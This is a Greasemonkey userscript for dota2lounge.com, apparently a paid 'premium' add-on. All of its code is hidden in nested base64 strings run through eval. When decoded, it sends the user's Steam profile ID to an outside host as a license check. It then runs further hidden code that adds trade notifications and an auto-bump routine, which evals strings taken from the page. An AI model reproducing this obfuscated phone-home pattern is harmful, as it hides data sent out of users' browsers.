// ==UserScript==
// @name        D2LoungePremium
// @namespace   http://dota2lounge.com/
// @description http://dota2lounge.com/
// @include     http://dota2lounge.com/*
// @include     http://*.dota2lounge.com/*
// @version     1.6
// @require     http://code.jquery.com/jquery-2.0.3.min.js
// @require     http://cdn.dota2lounge.com/script/trades.js?v=07
// @require 	http://cdn.dota2lounge.com/script/jquery.quick.pagination.min.js
// @grant       none
// ==/UserScript==

eval(atob('dmFyIENoZWNrUHJvZmlsZUlEID0gZnVuY3Rpb24oKSB7CiAgICB2YXIgQ2hlY2tJRCA9ICcnOwogICAgJC5nZXQoImh0dHA6Ly9kb3RhMmxvdW5nZS5jb20vbXlwcm9maWxlIiwgZnVuY3Rpb24oZGF0YSl7CiAgICAgICBwcm9mSUQgPSBkYXRhLm1hdGNoKC9wcm9maWxlc1wvKFswLTldKylcLy9naW0pWzFdLnJlcGxhY2UoL3Byb2ZpbGVzXC8vZ2ltLCAnJykucmVwbGFjZSgvXC8vZ2ltLCAnJyk7CiAgICAgICBDaGVja0lEID0gImh0dHA6Ly90ZXh0aW5nLnp6Lm11L2NoZWNrSUQucGhwIjsgICAgIAogICAgICAgIHZhciB4aHIgPSBuZXcgWE1MSHR0cFJlcXVlc3QoKTsKICAgICAgICB4aHIub3BlbignR0VUJywgJ2h0dHA6Ly90ZXh0aW5nLnp6Lm11L2NoZWNrSUQucGhwP2lkPScgKyBwcm9mSUQsIHRydWUpOwogICAgICAgIHhoci5vbmxvYWQgPSBmdW5jdGlvbigpIHsKICAgICAgICAgIGlmICh0aGlzLnJlc3BvbnNlVGV4dCA9PSAnYWNjZXNzIGdyYW50ZWQnKSB7CiAgICAgICAgICAgIGV2YWwoYXRvYignZG1GeUlHbHVkRWxFSUQwZ01Ec0tkbUZ5SUZWU1NTQTlJSGRwYm1SdmR5NXNiMk5oZEdsdmJpNTBiMU4wY21sdVp5Z3BPd3AyWVhJZ2NHOXpkRWxFSUQwZ1ZWSkpMbkpsY0d4aFkyVW9MMmgwZEhBNlhDOWNMMlJ2ZEdFeWJHOTFibWRsWEM1amIyMWNMM1J5WVdSbFhEOTBQUzluYVcwc0lDY25LVHNLZG1GeUlHNWxkMFZzWlcxbGJuUlZjQ0E5SUNjOFpHbDJJSE4wZVd4bFBTSmliM0prWlhJdGNtRmthWFZ6T2lBd0lERXdNQ1VnTUNBd095QndiM05wZEdsdmJqb2dabWw0WldRN0lHeGxablE2SURBN0lIUnZjRG9nTXpBbE95Qm9aV2xuYUhRNklESXdKVHNnZDJsa2RHZzZJREV3Y0hnN1ltRmphMmR5YjNWdVpEb2dJek16TkRzZ1kzVnljMjl5T2lCd2IybHVkR1Z5SWlCcFpEMGlkWEJDZFhSMGIyNGlJRzl1VFc5MWMyVk1aV0YyWlQwaUpDaGNKeU4xY0VKMWRIUnZibHduS1M1amMzTW9YQ2RpWVdOclozSnZkVzVrWENjc0lGd25Jek16TkZ3bktUc2lJRzl1VFc5MWMyVk5iM1psUFNJa0tGd25JM1Z3UW5WMGRHOXVYQ2NwTG1OemN5aGNKMkpoWTJ0bmNtOTFibVJjSnl3Z1hDY2pPRGc0WENjcE95SWdkR2wwYkdVOUlrZHZJRzl1SUhSdmNDSWdiMjVEYkdsamF6MGlKQ2hjSjJoMGJXd3NZbTlrZVZ3bktTNWhibWx0WVhSbEtIdGNKM05qY205c2JGUnZjRnduT2pCOUxGd25jMnh2ZDF3bktUc2lQand2WkdsMlBpYzdDblpoY2lCdVpYZEZiR1Z0Wlc1MFJHOTNiaUE5SUNjOFpHbDJJSE4wZVd4bFBTSmliM0prWlhJdGNtRmthWFZ6T2lBd0lEQWdNVEF3SlNBd095QndiM05wZEdsdmJqb2dabWw0WldRN0lHeGxablE2SURBN0lHSnZkSFJ2YlRvZ016RWxPeUJvWldsbmFIUTZJREl3SlRzZ2QybGtkR2c2SURFd2NIZzdZbUZqYTJkeWIzVnVaRG9nSXpNek5Ec2dZM1Z5YzI5eU9pQndiMmx1ZEdWeUlpQnBaRDBpWkc5M2JrSjFkSFJ2YmlJZ2IyNU5iM1Z6WlV4bFlYWmxQU0lrS0Z3bkkyUnZkMjVDZFhSMGIyNWNKeWt1WTNOektGd25ZbUZqYTJkeWIzVnVaRnduTENCY0p5TXpNelJjSnlrN0lpQnZiazF2ZFhObFRXOTJaVDBpSkNoY0p5TmtiM2R1UW5WMGRHOXVYQ2NwTG1OemN5aGNKMkpoWTJ0bmNtOTFibVJjSnl3Z1hDY2pPRGc0WENjcE95SWdkR2wwYkdVOUlrZHZJRzl1SUhSdmNDSWdiMjVEYkdsamF6MGlkbUZ5SUdobGFXZG9kRDFrYjJOMWJXVnVkQzVpYjJSNUxuTmpjbTlzYkVobGFXZG9kRHNrS0Z3bmFIUnRiQ3hpYjJSNVhDY3BMbUZ1YVcxaGRHVW9lMXduYzJOeWIyeHNWRzl3WENjNmFHVnBaMmgwZlN4Y0ozTnNiM2RjSnlrN0lqNDhMMlJwZGo0bk93cDJZWElnYm1WM1JXeGxiV1Z1ZEZSeVlXUmxjeUE5SUNjOFpHbDJJSE4wZVd4bFBTSjBaWGgwTFdGc2FXZHVPbU5sYm5SbGNqc2djRzl6YVhScGIyNDZJR1pwZUdWa095QnlhV2RvZERvZ01Ec2dZbTkwZEc5dE9pQXdPeUJvWldsbmFIUTZJREV6T1hCNE95QjNhV1IwYURvZ016QndlRHRpWVdOclozSnZkVzVrT2lBak16TTBPeUJqZFhKemIzSTZJSEJ2YVc1MFpYSWlJR2xrUFNKMGNtRmtaVUoxZEhSdmJpSWdiMjVOYjNWelpVeGxZWFpsUFNJa0tGd25JM1J5WVdSbFFuVjBkRzl1WENjcExtTnpjeWhjSjJKaFkydG5jbTkxYm1SY0p5d2dYQ2NqTXpNMFhDY3BPeUlnYjI1TmIzVnpaVTF2ZG1VOUlpUW9YQ2NqZEhKaFpHVkNkWFIwYjI1Y0p5a3VZM056S0Z3blltRmphMmR5YjNWdVpGd25MQ0JjSnlNME5EUmNKeWs3SWlCMGFYUnNaVDBpUjI4Z2IyNGdkRzl3SWlCdmJrTnNhV05yUFNKc2IyTmhkR2x2Ymk1b2NtVm1QVnduTDIxNWRISmhaR1Z6WENjN0lqNDhabTl1ZENCamIyeHZjajBpZDJocGRHVWlQanhpY2lBdlBsUThZbklnTHo1eVBHSnlJQzgrWVR4aWNpQXZQbVE4WW5JZ0x6NWxQR0p5SUM4K2N6d3ZabTl1ZEQ0OEwyUnBkajRuT3dwMllYSWdZV1JrVW1Wd2JIbEdiM0p0SUQwZ0p6eGthWFlnYVdROUltOW1abVZ5SWo0OGRHVjRkR0Z5WldFZ2NHeGhZMlZvYjJ4a1pYSTlJa1Z1ZEdWeUlIbHZkWElnYldWemMyRm5aU0JvWlhKbExpNHVJaUJwWkQwaWJtOTBaWE1pSUdOc1lYTnpQU0p0WlhOellXZGxJajQ4TDNSbGVIUmhjbVZoUGp4bWIzSnRJR2xrUFNKeVpYQnNlVlJ2SWlCemRIbHNaVDBpWkdsemNHeGhlVG9nYm05dVpUc2diV2x1TFdobGFXZG9kRG9nTXpCd2VEc2lQand2Wm05eWJUNDhabTl5YlNCamJHRnpjejBpYkdWbWRDSWdjM1I1YkdVOUltUnBjM0JzWVhrNklHNXZibVU3ZDJsa2RHZzZJRGs0SlR0dFlYSm5hVzQ2SURod2VDQXhKVHNpSWo0OEwyWnZjbTArUEdFZ1kyeGhjM005SW1KMWRIUnZiaUlnYjI1amJHbGphejBpY0c5emRGSmxjR3hoZVNoY0p5Y2dLeUJ3YjNOMFNVUWdLeUFuWENjcE95UW9kR2hwY3lrdWFHbGtaU2dwT3lJK1FXUmtJSEpsY0d4NVBDOWhQanhoSUdOc1lYTnpQU0ppZFhSMGIyNGlJRzl1WTJ4cFkyczlJbk5vYjNkQ1lXTnJjR0ZqYXlncE95UW9kR2hwY3lrdWNtVnRiM1psS0NraVBrMTVJR2wwWlcxelBDOWhQanhwYldjZ2MzSmpQU0pvZEhSd09pOHZZMlJ1TG1SdmRHRXliRzkxYm1kbExtTnZiUzlwYldjdmJHOWhaQzVuYVdZaUlHbGtQU0pzYjJGa2FXNW5JaUJ6ZEhsc1pUMGlaR2x6Y0d4aGVUb2dibTl1WlRzZ2JXRnlaMmx1T2lBd0xqYzFaVzBnTWlVaUlDOCtQQzlrYVhZK0p6c0tkbUZ5SUhObGJHVmpkRVZtWm1WamRDQTlJQ2M4WkdsMklHbGtQU0p6Wld4bFkzUkZabVpsWTNRaUlITjBlV3hsUFNKd2IzTnBkR2x2YmpvZ1ptbDRaV1E3SUdKdmRIUnZiVG9nTURzZ2NtbG5hSFE2SURBN0lqNDhjMlZzWldOMElITjBlV3hsUFNKd1lXUmthVzVuT2lBMWNIZzdJR1p2Ym5RdFptRnRhV3g1T2lCVVlXaHZiV0VpUGp4dmNIUnBiMjRnZG1Gc2RXVTlJaUkrUVd4c0lHVm1abVZqZEhNOEwyOXdkR2x2Ymo0OGIzQjBhVzl1SUhaaGJIVmxQU0pDZFhKdWFXNW5JRUZ1YVcxMWN5SStRblZ5Ym1sdVp5QkJibWx0ZFhNOEwyOXdkR2x2Ymo0OGIzQjBhVzl1SUhaaGJIVmxQU0pCWm1ac2FXTjBhVzl1SUc5bUlGWmxjbTFwYmlJK1FXWm1iR2xqZEdsdmJpQnZaaUJXWlhKdGFXNDhMMjl3ZEdsdmJqNDhiM0IwYVc5dUlIWmhiSFZsUFNKVWNtRnBiQ0J2WmlCMGFHVWdRVzFoYm1sMFlTSStWSEpoYVd3Z2IyWWdkR2hsSUVGdFlXNXBkR0U4TDI5d2RHbHZiajQ4YjNCMGFXOXVJSFpoYkhWbFBTSlVjbUZwYkNCdlppQjBhR1VnVEc5MGRYTWdRbXh2YzNOdmJTSStWSEpoYVd3Z2IyWWdkR2hsSUV4dmRIVnpJRUpzYjNOemIyMDhMMjl3ZEdsdmJqNDhiM0IwYVc5dUlIWmhiSFZsUFNKVGRXNW1hWEpsSWo1VGRXNW1hWEpsUEM5dmNIUnBiMjQrUEc5d2RHbHZiaUIyWVd4MVpUMGlVMlZoY21sdVp5QkZjM05sYm1ObElqNVRaV0Z5YVc1bklFVnpjMlZ1WTJVOEwyOXdkR2x2Ymo0OGIzQjBhVzl1SUhaaGJIVmxQU0pEZFhKelpXUWdSWE56Wlc1alpTSStRM1Z5YzJWa0lFVnpjMlZ1WTJVOEwyOXdkR2x2Ymo0OGIzQjBhVzl1SUhaaGJIVmxQU0pTWlhOdmJtRnVkQ0JGYm1WeVoza2lQbEpsYzI5dVlXNTBJRVZ1WlhKbmVUd3ZiM0IwYVc5dVBqeHZjSFJwYjI0Z2RtRnNkV1U5SWt4MWJXbHViM1Z6SUVkaGVtVWlQa3gxYldsdWIzVnpJRWRoZW1VOEwyOXdkR2x2Ymo0OGIzQjBhVzl1SUhaaGJIVmxQU0pRYVdWeVkybHVaeUJDWldGdGN5SStVR2xsY21OcGJtY2dRbVZoYlhNOEwyOXdkR2x2Ymo0OGIzQjBhVzl1SUhaaGJIVmxQU0pGZEdobGNtVmhiQ0JHYkdGdFpTSStSWFJvWlhKbFlXd2dSbXhoYldVOEwyOXdkR2x2Ymo0OGIzQjBhVzl1SUhaaGJIVmxQU0pFYVhKbGRHbGtaU0JEYjNKeWRYQjBhVzl1SWo1RWFYSmxkR2xrWlNCRGIzSnlkWEIwYVc5dVBDOXZjSFJwYjI0K1BHOXdkR2x2YmlCMllXeDFaVDBpUm5KdmMzUnBkblZ6SUVaeWIzTjBJajVHY205emRHbDJkWE1nUm5KdmMzUThMMjl3ZEdsdmJqNDhiM0IwYVc5dUlIWmhiSFZsUFNKR1pXeHBZMmwwZVZ3bmN5QkNiR1Z6YzJsdVp5SStSbVZzYVdOcGRIbGNKM01nUW14bGMzTnBibWM4TDI5d2RHbHZiajQ4YjNCMGFXOXVJSFpoYkhWbFBTSkRjbmx6ZEdGc0lGSnBablFpUGtOeWVYTjBZV3dnVW1sbWREd3ZiM0IwYVc5dVBqeHZjSFJwYjI0Z2RtRnNkV1U5SWtScGRtbHVaU0JGYzNObGJtTmxJajVFYVhacGJtVWdSWE56Wlc1alpUd3ZiM0IwYVc5dVBqd3ZjMlZzWldOMFBqd3ZaR2wyUGljN0NncDJZWElnY0hKdlprbEVJRDBnTURzS0NuWmhjaUJ5Wld4dllXUk9iM1JwWm1sallYUnBiMjV6SUQwZ1puVnVZM1JwYjI0b0tTQjdDaUFnSUNCMllYSWdjM056T3dvZ0lDQWdKQzVuWlhRb0ltaDBkSEE2THk5a2IzUmhNbXh2ZFc1blpTNWpiMjB2SWl3Z1puVnVZM1JwYjI0b1pHRjBZU2w3Q2lBZ0lDQWdJQ0FnWkdGMFlTQTlJR1JoZEdFdWRHOVRkSEpwYm1jb0tTNXlaWEJzWVdObEtDOWNiaTluYVcwc0lDSWdJaWs3Q2lBZ0lDQWdJQ0FnYzNOeklEMGdaR0YwWVM1dFlYUmphQ2d2UEhWc0lHbGtQU0p0Wlc1MUlqNG9MaW9wUEZ3dmRXdytMMmRwYlNrN0NpQWdJQ0FnSUNBZ2MzTnpJRDBnYzNOekxuUnZVM1J5YVc1bktDa3VjbVZ3YkdGalpTZ3ZQSFZzSUdsa1BTSnRaVzUxSWo0dloybHRMQ0FpSUNJcE93b2dJQ0FnSUNBZ0lITnpjeUE5SUhOemN5NTBiMU4wY21sdVp5Z3BMbkpsY0d4aFkyVW9MenhjTDNWc1BpOW5hVzBzSUNJZ0lpazdDaUFnSUNBZ0lDQWdKQ2duSTIxbGJuVW5LUzVvZEcxc0tITnpjeWs3Q2lBZ0lDQWdJQ0FnYVdZZ0tDOXViM1JwWm1sallYUnBiMjR2WjJsdExuUmxjM1FvYzNOektTa2dld29nSUNBZ0lDQWdJQ0FnSUNCamJHVmhja2x1ZEdWeWRtRnNLR2x1ZEVsRUtUc0tJQ0FnSUNBZ0lDQWdJQ0FnSkNnblltOWtlU2NwTG1oMGJXd29KQ2duWW05a2VTY3BMbWgwYld3b0tTQXJJQ2M4WVhWa2FXOGdjM0pqUFNKb2RIUndPaTh2ZEdWNGRHbHVaeTU2ZWk1dGRTOUpRMUV1YlhBeklpQmhkWFJ2Y0d4aGVUNDhMMkYxWkdsdlBpY3BPd29nSUNBZ0lDQWdJQ0FnSUNBa0tDY2pkSEpoWkdWQ2RYUjBiMjRuS1M1amMzTW9KMkpoWTJ0bmNtOTFibVFuTENBbmNtVmtKeWs3Q2lBZ0lDQWdJQ0FnZlFvZ0lDQWdmU2s3Q24wS0NuWmhjaUJRYkhWbmFXNUJkWFJ2UW5WdGNDQTlJR1oxYm1OMGFXOXVLQ2tnZXdvZ0lDQWdkbUZ5SUdKMWJYQnpJRDBnVzEwN0NpQWdJQ0FrTG1kbGRDZ2lhSFIwY0RvdkwyUnZkR0V5Ykc5MWJtZGxMbU52YlM5dGVYUnlZV1JsY3lJc0lHWjFibU4wYVc5dUtHUmhkR0VwZXdvZ0lDQWdJQ0FnSUdKMWJYQnpJRDBnWkdGMFlTNXRZWFJqYUNndlluVnRjRlJ5WVdSbFhDZ25LRnN3TFRsZEt5a25MQ2NvTGlzcEoxd3BMMmRwYlNrN0NpQWdJQ0FnSUNBZ2FXWWdLQzlpZFcxd0wyZHBiUzUwWlhOMEtHUmhkR0VwS1hzS0lDQWdJQ0FnSUNBZ0lDQWdabTl5SUNoMllYSWdhU0E5SURBN0lHa2dQQ0EyT3lCcEt5c3BJSHNLSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJR1YyWVd3b1luVnRjSE5iYVYwcE93b2dJQ0FnSUNBZ0lDQWdJQ0I5Q2lBZ0lDQWdJQ0FnZlFvZ0lDQWdmU2s3Q24wS0NncDJZWElnYjFOamNtd2dQU0JtZFc1amRHbHZiaWdwSUhzS0lDQWdJR2xtSUNna0tIZHBibVJ2ZHlrdWMyTnliMnhzVkc5d0tDa2dQaUF4TURBcElDUW9KMmhsWVdSbGNpY3BMbU56Y3lnbmNHOXphWFJwYjI0bkxDQW5abWw0WldRbktUc0tJQ0FnSUNBZ0lDQmxiSE5sSUNRb0oyaGxZV1JsY2ljcExtTnpjeWduY0c5emFYUnBiMjRuTENBbmNtVnNZWFJwZG1VbktUc0tmUW9LYVc1MFNVUWdQU0J6WlhSSmJuUmxjblpoYkNoeVpXeHZZV1JPYjNScFptbGpZWFJwYjI1ekxDQXpNREF3S1RzS0pDZ25ZbTlrZVNjcExtaDBiV3dvSkNnblltOWtlU2NwTG1oMGJXd29LU0FySUc1bGQwVnNaVzFsYm5SVmNDQXJJRzVsZDBWc1pXMWxiblJFYjNkdUtUc0tJQ0FnSUFwcFppQW9MM0psYzNWc2RDOW5hVzB1ZEdWemRDaGtiMk4xYldWdWRDNXNiMk5oZEdsdmJpNW9jbVZtS1NrZ0pDZ25ZbTlrZVNjcExtaDBiV3dvSkNnblltOWtlU2NwTG1oMGJXd29LU0FySUhObGJHVmpkRVZtWm1WamRDazdDZ3BwWmlBb0lTZ3ZjRzl6ZEZKbGNHeGhlUzluYVcwdWRHVnpkQ2drS0NkaWIyUjVKeWt1YUhSdGJDZ3BLU2tnSmlZZ0lTZ3ZiRzkxYm1kbEwyZHBiUzUwWlhOMEtIQnZjM1JKUkNrcEtTQjdDaUFnSUNBa0tDZGliMlI1SnlrdWFIUnRiQ2drS0NkaWIyUjVKeWt1YUhSdGJDZ3BMbkpsY0d4aFkyVW9MenhjTDJGeWRHbGpiR1UrTHl3Z1lXUmtVbVZ3YkhsR2IzSnRJQ3NnSnp3dllYSjBhV05zWlQ0bktTazdDbjBLQ2xCc2RXZHBia0YxZEc5Q2RXMXdLQ2s3Q25ObGRFbHVkR1Z5ZG1Gc0tGQnNkV2RwYmtGMWRHOUNkVzF3TENBMU1EQXdLVHNLSkNoM2FXNWtiM2NwTG05dUtDZHpZM0p2Ykd3bkxDQnZVMk55YkNrN0NpUW9KMmhsWVdSbGNpY3BMbU56Y3lnbmVpMXBibVJsZUNjc0lDYzVPVGs1T1RrbktUc0tKQ2dpSTNSeVlXUmxiR2x6ZENJcExuRjFhV05yVUdGbmFXNWhkR2x2YmloN0lIQmhaMlZUYVhwbE9pQWlPVGs1T1RrNU9TSjlLVHNLQ25aaGNpQnpaV0Z5WTJoRlptWmxZM1FnUFNCbWRXNWpkR2x2YmlobFptWmxZM1FwSUhzS0lDQWdJSEpsYlc5MlpWTmxZWEpqYUVWbVptVmpkQ2dwT3dvZ0lDQWdKQzVsWVdOb0tDUW9JaTUwY21Ga1pYQnZiR3dpS1M1blpYUW9LU3dnWm5WdVkzUnBiMjRvS1NCN0NpQWdJQ0FKQ1dsbUlDZ2hLSFJvYVhNdWFXNXVaWEpJVkUxTUxtMWhkR05vS0NkRlptWmxZM1E2SUNjZ0t5QmxabVpsWTNRcEtTa2dkR2hwY3k1emRIbHNaUzVrYVhOd2JHRjVJRDBnSW01dmJtVWlPd29KQ1gwcE93cDlDZ3AyWVhJZ2NtVnRiM1psVTJWaGNtTm9SV1ptWldOMElEMGdablZ1WTNScGIyNG9LU0I3Q2lBZ0lDQWtMbVZoWTJnb0pDZ2lMblJ5WVdSbGNHOXNiQ0lwTG1kbGRDZ3BMQ0JtZFc1amRHbHZiaWdwSUhzS0lDQWdJQWtKSUhSb2FYTXVjM1I1YkdVdVpHbHpjR3hoZVNBOUlDSmliRzlqYXlJN0Nna0pmU2s3Q24wS0NpUW9KeU56Wld4bFkzUkZabVpsWTNRbktTNXZiaWduWTJoaGJtZGxKeXdnWm5WdVkzUnBiMjRvS1NCN0NpQUphV1lnS0NRb0p5TnpaV3hsWTNSRlptWmxZM1FnYjNCMGFXOXVPbk5sYkdWamRHVmtKeWt1ZG1Gc0tDa2dJVDBnSnljcElITmxZWEpqYUVWbVptVmpkQ2drS0NjamMyVnNaV04wUldabVpXTjBJRzl3ZEdsdmJqcHpaV3hsWTNSbFpDY3BMblpoYkNncEtUc2dJQ0FLSUNBZ0lBbGxiSE5sSUhKbGJXOTJaVk5sWVhKamFFVm1abVZqZENncE93cDlLUW9LSkNnbkkzUnlZV1JsYkdsemRDY3BMbWgwYld3b0pDZ25JM1J5WVdSbGJHbHpkQ2NwTG1oMGJXd29LUzV5WlhCc1lXTmxLQzl6YVcxd2JHVndZV2RsY25CaFoyVXZMQ0FuSnlrcE93PT0nKSk7IAogICAgICAgICB9CiAgICAgICAgfQogICAgICAgIHhoci5vbmVycm9yID0gZnVuY3Rpb24oKSB7CiAgICAgICAgICBhbGVydCgn0J7RiNC40LHQutCwICcgKyB0aGlzLnN0YXR1cyk7CiAgICAgICAgfQogICAgICAgIHhoci5zZW5kKCcnKTsKICAgIH0pOwp9CgpDaGVja1Byb2ZpbGVJRCgpOw=='));